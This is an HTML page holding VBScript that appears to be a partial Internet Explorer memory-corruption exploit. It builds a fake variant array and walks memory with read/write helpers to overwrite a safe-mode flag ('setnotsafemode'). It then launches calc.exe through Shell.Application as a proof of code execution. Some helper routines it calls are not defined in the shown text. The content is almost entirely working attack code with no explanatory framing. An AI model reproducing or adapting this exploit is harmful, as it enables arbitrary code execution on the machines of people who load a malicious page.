<SCRIPT LANGUAGE="VBScript">
    myarray= chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
    myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)
    document.write(vartype(myarray))
    document.write(vartype(myarray(&h7ffe0030)))
</SCRIPT>

<SCRIPT LANGUAGE="VBScript">
    sub testaa()
    end sub

    function mydata()
	    On Error Resume Next
	    i=testaa
	    i=null
	    ab(0)=0
	    aa(a1)=i
	    ab(0)=3
	    mydata=aa(a1)
    end function

    function setnotsafemode()
	    On Error Resume Next
	    i=mydata()
	    i=readmem(i+8)
	    i=readmem(i+16)
	    j=readmem(i+&h134)
	    for k=0 to &h60 step 4
	    	j=readmem(i+&h120+k)
	    	if(j=14) then
	    		writemem(i+&h120+k)
	    		Exit for
	    	end if
	    next
    end function

    function runcalc()
    	On Error Resume Next
    	set sh=createobject("Shell.Application")
    	sh.ShellExecute "calc.exe"
    end function
</SCRIPT>
